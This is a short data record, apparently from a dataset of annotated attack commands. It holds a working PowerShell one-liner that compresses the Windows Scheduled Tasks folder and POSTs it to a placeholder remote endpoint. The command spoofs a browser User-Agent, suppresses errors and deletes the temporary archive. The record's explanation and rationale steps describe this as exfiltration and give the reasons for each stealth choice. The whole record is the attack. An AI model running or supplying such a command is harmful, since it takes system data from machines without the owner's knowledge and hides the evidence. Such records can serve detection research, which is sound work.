command: $ProgressPreference='SilentlyContinue'; $z=Join-Path $env:TEMP ('tasks_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\Windows\System32\Tasks' -DestinationPath $z -Force; Invoke-WebRequest -Uri 'https://cdn.example.net/content/upload/tasks' -Method Post -InFile $z -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'Accept'='*/*' } -ErrorAction SilentlyContinue; Remove-Item $z -Force
explanation: Packages the Scheduled Tasks directory and exfiltrates it over HTTPS POST to a remote endpoint.
rationale_steps: Compress scheduled task definitions that reveal persistence and activity.
Send the archive via Invoke-WebRequest POST with a generic content type.
Suppress progress and clean up temporary artifacts.
